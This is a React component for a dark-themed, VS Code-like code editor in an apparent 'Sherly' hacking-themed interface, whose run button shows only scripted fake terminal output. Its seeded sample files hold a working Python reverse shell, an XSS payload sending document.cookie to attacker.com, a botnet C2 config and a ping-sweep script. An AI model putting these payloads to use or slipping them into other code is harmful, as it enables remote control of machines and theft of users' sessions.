
import React, { useState, useEffect } from 'react';
import { 
  FileCode, Save, Plus, Trash2, FolderOpen, Play, Code, FileJson, 
  FileTerminal, ChevronRight, ChevronDown, Check, Terminal, 
  Search, GitBranch, Bug, AppWindow, Settings, X, MoreHorizontal 
} from 'lucide-react';

interface CodeFile {
  id: string;
  name: string;
  language: 'python' | 'javascript' | 'bash' | 'json';
  content: string;
}

const CodeEditor: React.FC = () => {
  const [files, setFiles] = useState<CodeFile[]>([
    {
      id: '1',
      name: 'exploit_payload.py',
      language: 'python',
      content: `import socket\nimport subprocess\nimport os\n\n# Sherly-Lab Exploit V1.0\nTARGET_IP = "192.168.1.105"\nPORT = 4444\n\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((TARGET_IP, PORT))\n    while True:\n        data = s.recv(1024)\n        if data.decode("utf-8") == "exit":\n            break\n        proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        stdout_value = proc.stdout.read() + proc.stderr.read()\n        s.send(stdout_value)\n    s.close()\n\nif __name__ == "__main__":\n    connect()`
    },
    {
      id: '2',
      name: 'network_scan.sh',
      language: 'bash',
      content: `#!/bin/bash\n\necho "Starting Network Scan..."\nTARGET="10.0.2.0/24"\n\nfor ip in $(seq 1 254); do\n    ping -c 1 10.0.2.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &\ndone\n\nwait\necho "Scan Complete."`
    },
    {
      id: '3',
      name: 'config_botnet.json',
      language: 'json',
      content: `{\n  "c2_server": "103.45.22.11",\n  "port": 8080,\n  "encryption": "AES-256",\n  "bots": [\n    {"id": "bot_01", "status": "active"},\n    {"id": "bot_02", "status": "dormant"}\n  ]\n}`
    },
    {
      id: '4',
      name: 'xss_stealer.js',
      language: 'javascript',
      content: `// Cookie Stealer Payload\nconst img = new Image();\nimg.src = "http://attacker.com/log?cookie=" + document.cookie;\ndocument.body.appendChild(img);\n\nconsole.log("Payload executed successfully");`
    }
  ]);

  const [activeFileId, setActiveFileId] = useState<string>('1');
  const [currentCode, setCurrentCode] = useState<string>('');
  const [isSaved, setIsSaved] = useState(true);
  const [isSidebarOpen, setIsSidebarOpen] = useState(true);
  const [isTerminalOpen, setIsTerminalOpen] = useState(false);
  const [terminalOutput, setTerminalOutput] = useState<string[]>([]);
  const [activeActivity, setActiveActivity] = useState('explorer');

  // Sync content when active file changes
  useEffect(() => {
    const file = files.find(f => f.id === activeFileId);
    if (file) {
      setCurrentCode(file.content);
      setIsSaved(true);
    }
  }, [activeFileId]);

  const activeFile = files.find(f => f.id === activeFileId);

  const handleCodeChange = (newCode: string) => {
    setCurrentCode(newCode);
    setIsSaved(false);
  };

  const saveFile = () => {
    setFiles(prev => prev.map(f => 
      f.id === activeFileId ? { ...f, content: currentCode } : f
    ));
    setIsSaved(true);
  };

  const runCode = () => {
      setIsTerminalOpen(true);
      setTerminalOutput([`> Executing ${activeFile?.name}...`]);
      
      setTimeout(() => {
          let output: string[] = [];
          if (activeFile?.language === 'python') {
             output = [
                 `Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux`,
                 `Type "help", "copyright", "credits" or "license" for more information.`,
                 `> Connecting to target 192.168.1.105...`,
                 `> Connection established.`,
                 `> Sending payload...`,
                 `> Payload sent successfully.`
             ];
          } else if (activeFile?.language === 'bash') {
              output = [
                  `Starting Network Scan...`,
                  `64 bytes from 10.0.2.10: icmp_seq=1 ttl=64 time=0.032 ms`,
                  `64 bytes from 10.0.2.15: icmp_seq=1 ttl=64 time=0.041 ms`,
                  `64 bytes from 10.0.2.44: icmp_seq=1 ttl=64 time=0.088 ms`,
                  `Scan Complete.`
              ];
          } else if (activeFile?.language === 'javascript') {
              output = [
                  `> Payload executed successfully`,
                  `> Image object created`,
                  `> Request sent to http://attacker.com/log?cookie=...`
              ];
          } else {
              output = [`> File ${activeFile?.name} is not executable or config file.`];
          }
          setTerminalOutput(prev => [...prev, ...output, `> Process exited with code 0`]);
      }, 800);
  };

  const addNewFile = () => {
    const newId = Math.random().toString(36).substr(2, 9);
    const newFile: CodeFile = {
      id: newId,
      name: `untitled_${files.length + 1}.py`,
      language: 'python',
      content: '# New Script\nprint("Hello World")'
    };
    setFiles([...files, newFile]);
    setActiveFileId(newId);
  };

  const deleteFile = (e: React.MouseEvent, id: string) => {
    e.stopPropagation();
    const newFiles = files.filter(f => f.id !== id);
    setFiles(newFiles);
    if (activeFileId === id && newFiles.length > 0) {
      setActiveFileId(newFiles[0].id);
    }
  };

  const getIcon = (lang: string) => {
    switch(lang) {
      case 'python': return <FileCode size={14} className="text-blue-400" />;
      case 'javascript': return <FileCode size={14} className="text-yellow-400" />;
      case 'json': return <FileJson size={14} className="text-green-400" />;
      case 'bash': return <FileTerminal size={14} className="text-gray-400" />;
      default: return <FileCode size={14} />;
    }
  };

  return (
    <div className="h-full flex flex-col bg-[#1e1e1e] border border-green-900 overflow-hidden rounded-lg shadow-2xl font-sans">
      <div className="flex-1 flex overflow-hidden">
        {/* Activity Bar (Far Left) */}
        <div className="w-12 bg-[#333333] flex flex-col items-center py-2 gap-4 border-r border-[#1e1e1e]">
            <ActivityIcon icon={<FileCode size={24} />} active={activeActivity === 'explorer'} onClick={() => { setActiveActivity('explorer'); setIsSidebarOpen(true); }} />
            <ActivityIcon icon={<Search size={24} />} active={activeActivity === 'search'} onClick={() => setActiveActivity('search')} />
            <ActivityIcon icon={<GitBranch size={24} />} active={activeActivity === 'git'} onClick={() => setActiveActivity('git')} />
            <ActivityIcon icon={<Bug size={24} />} active={activeActivity === 'debug'} onClick={() => setActiveActivity('debug')} />
            <ActivityIcon icon={<AppWindow size={24} />} active={activeActivity === 'extensions'} onClick={() => setActiveActivity('extensions')} />
            <div className="flex-1" />
            <ActivityIcon icon={<Settings size={24} />} active={false} onClick={() => {}} />
        </div>

        {/* Sidebar Explorer */}
        {isSidebarOpen && activeActivity === 'explorer' && (
          <div className="w-56 bg-[#252526] flex flex-col text-gray-400 text-sm">
             <div className="h-9 px-4 flex items-center justify-between text-[11px] font-bold tracking-wider uppercase">
                <span>Explorer</span>
                <MoreHorizontal size={16} />
             </div>
             
             {/* Project Section */}
             <div className="flex-1 overflow-y-auto">
                 <div className="px-1 py-1">
                     <div className="flex items-center gap-1 hover:bg-[#2a2d2e] cursor-pointer py-1 px-2">
                        <ChevronDown size={14} />
                        <span className="font-bold text-xs">SHERLY-WORKSPACE</span>
                     </div>
                     <div className="pl-2">
                        {files.map(file => (
                          <div 
                            key={file.id} 
                            onClick={() => setActiveFileId(file.id)}
                            className={`px-2 py-1 flex items-center justify-between text-xs cursor-pointer group hover:bg-[#2a2d2e] ${activeFileId === file.id ? 'bg-[#37373d] text-white' : ''}`}
                          >
                             <div className="flex items-center gap-2">
                                {getIcon(file.language)}
                                <span className="truncate">{file.name}</span>
                             </div>
                             {activeFileId === file.id && (
                               <button onClick={(e) => deleteFile(e, file.id)} className="opacity-0 group-hover:opacity-100 hover:text-red-400">
                                  <Trash2 size={12} />
                               </button>
                             )}
                          </div>
                        ))}
                        <div onClick={addNewFile} className="px-2 py-1 flex items-center gap-2 text-xs cursor-pointer hover:bg-[#2a2d2e] text-blue-400">
                            <Plus size={12} /> New File...
                        </div>
                     </div>
                 </div>
             </div>
          </div>
        )}

        {/* Main Editor Area */}
        <div className="flex-1 flex flex-col min-w-0 bg-[#1e1e1e]">
            {/* Tabs */}
            <div className="h-9 bg-[#252526] flex items-center overflow-x-auto scrollbar-hide">
                 {files.map(f => (
                   <div 
                     key={f.id}
                     onClick={() => setActiveFileId(f.id)}
                     className={`h-full px-3 min-w-[120px] max-w-[200px] flex items-center gap-2 cursor-pointer border-r border-[#1e1e1e] text-xs select-none ${activeFileId === f.id ? 'bg-[#1e1e1e] text-white border-t-2 border-t-green-500' : 'bg-[#2d2d2d] text-gray-500 hover:bg-[#2a2d2e]'}`}
                   >
                     {getIcon(f.language)}
                     <span className="truncate flex-1">{f.name}</span>
                     <X size={12} className="opacity-0 group-hover:opacity-100 hover:bg-gray-700 rounded p-0.5" onClick={(e) => {e.stopPropagation(); deleteFile(e, f.id)}} />
                     {activeFileId === f.id && !isSaved && <div className="w-2 h-2 rounded-full bg-white ml-1"></div>}
                   </div>
                 ))}
                 <div className="flex-1 bg-[#252526] h-full flex items-center justify-end px-2 gap-2">
                     <button onClick={runCode} className="p-1 hover:bg-[#333] rounded text-green-500" title="Run Code">
                         <Play size={14} fill="currentColor" />
                     </button>
                     <button onClick={() => setIsTerminalOpen(!isTerminalOpen)} className="p-1 hover:bg-[#333] rounded text-gray-400" title="Toggle Terminal">
                         <AppWindow size={14} />
                     </button>
                 </div>
            </div>

            {/* Breadcrumb / Toolbar */}
            <div className="h-6 flex items-center px-4 bg-[#1e1e1e] text-gray-500 text-xs gap-2 border-b border-[#333]">
                <span>sherly-workspace</span>
                <ChevronRight size={12} />
                <span className="text-white">{activeFile?.name}</span>
                {isSaved ? <span className="ml-auto flex items-center gap-1 text-gray-500"><Check size={12} /> Saved</span> : <span className="ml-auto flex items-center gap-1 text-white"><div className="w-2 h-2 rounded-full bg-white"/> Unsaved</span>}
            </div>

            {/* Content Area split */}
            <div className="flex-1 flex flex-col overflow-hidden relative">
               {activeFile ? (
                 <div className={`flex-1 flex overflow-hidden ${isTerminalOpen ? 'h-2/3' : 'h-full'}`}>
                    {/* Line Numbers */}
                    <div className="w-12 bg-[#1e1e1e] text-[#858585] text-right pr-4 pt-4 text-xs font-mono select-none">
                       {currentCode.split('\n').map((_, i) => (
                         <div key={i} className="leading-6">{i + 1}</div>
                       ))}
                    </div>
                    {/* Text Area */}
                    <textarea
                      value={currentCode}
                      onChange={(e) => handleCodeChange(e.target.value)}
                      className="flex-1 bg-[#1e1e1e] text-[#d4d4d4] p-4 font-mono text-sm leading-6 resize-none outline-none border-none whitespace-pre scrollbar-hide"
                      spellCheck="false"
                      autoCapitalize="off"
                      autoComplete="off"
                      autoCorrect="off"
                    />
                 </div>
               ) : (
                 <div className="flex-1 flex items-center justify-center text-gray-600">
                   <div className="text-center">
                     <Code size={64} className="mx-auto mb-4 opacity-20" />
                     <p>Select a file to edit</p>
                     <p className="text-xs mt-2">Ctrl+N to create new file</p>
                   </div>
                 </div>
               )}
               
               {/* Terminal Panel */}
               {isTerminalOpen && (
                   <div className="h-1/3 bg-[#1e1e1e] border-t border-[#333] flex flex-col">
                       <div className="h-8 flex items-center px-4 gap-6 text-xs uppercase tracking-wider border-b border-[#333] select-none">
                           <span className="text-white border-b border-white py-2 cursor-pointer">Terminal</span>
                           <span className="text-gray-500 hover:text-gray-300 cursor-pointer">Output</span>
                           <span className="text-gray-500 hover:text-gray-300 cursor-pointer">Debug Console</span>
                           <span className="text-gray-500 hover:text-gray-300 cursor-pointer">Problems</span>
                           <div className="flex-1" />
                           <X size={14} className="cursor-pointer hover:text-white text-gray-500" onClick={() => setIsTerminalOpen(false)} />
                       </div>
                       <div className="flex-1 p-4 font-mono text-xs overflow-y-auto bg-[#1e1e1e] text-gray-300 scrollbar-hide">
                           {terminalOutput.length === 0 ? (
                               <div className="text-gray-600">No active processes. Click 'Run' to execute.</div>
                           ) : (
                               terminalOutput.map((line, i) => (
                                   <div key={i} className="mb-1">{line}</div>
                               ))
                           )}
                           <div className="animate-pulse">_</div>
                       </div>
                   </div>
               )}
            </div>
        </div>
      </div>

      {/* Status Bar */}
      <div className="h-6 bg-[#007acc] text-white text-[11px] flex items-center justify-between px-3 select-none z-10">
         <div className="flex gap-4 items-center">
            <span className="flex items-center gap-1 hover:bg-[#1f8ad2] px-2 py-0.5 rounded cursor-pointer"><GitBranch size={10} /> main*</span>
            <span className="flex items-center gap-1 hover:bg-[#1f8ad2] px-2 py-0.5 rounded cursor-pointer"><FolderOpen size={10} /> 0 Errors</span>
         </div>
         <div className="flex gap-4 items-center">
            <span className="hover:bg-[#1f8ad2] px-2 py-0.5 rounded cursor-pointer">Ln {currentCode.split('\n').length}, Col 1</span>
            <span className="hover:bg-[#1f8ad2] px-2 py-0.5 rounded cursor-pointer">UTF-8</span>
            <span className="hover:bg-[#1f8ad2] px-2 py-0.5 rounded cursor-pointer">{activeFile?.language.toUpperCase() || 'PLAINTEXT'}</span>
            <span className="hover:bg-[#1f8ad2] px-2 py-0.5 rounded cursor-pointer flex items-center gap-1"><Check size={10} /> Prettier</span>
         </div>
      </div>
    </div>
  );
};

const ActivityIcon: React.FC<{icon: any, active: boolean, onClick: () => void}> = ({icon, active, onClick}) => (
    <div 
      onClick={onClick}
      className={`w-12 h-12 flex items-center justify-center cursor-pointer border-l-2 transition-colors ${active ? 'border-white text-white' : 'border-transparent text-gray-500 hover:text-gray-300'}`}
    >
        {icon}
    </div>
);

export default CodeEditor;
